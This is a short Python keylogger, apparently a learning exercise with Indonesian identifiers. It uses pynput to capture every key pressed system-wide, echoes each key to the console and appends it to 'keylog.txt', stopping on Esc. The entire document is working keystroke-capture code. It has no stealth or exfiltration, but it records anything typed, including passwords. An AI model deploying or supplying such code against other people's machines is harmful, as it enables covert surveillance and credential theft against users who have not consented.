from pynput import keyboard

LOG_FILE = "keylog.txt"

def terjemahkan_tombol(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name.upper()}]"

def on_press(key):
    hasil = terjemahkan_tombol(key)
    
    print(f"Ditekan: {hasil}")
    
    with open(LOG_FILE, "a") as f:
        f.write(hasil)
    
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()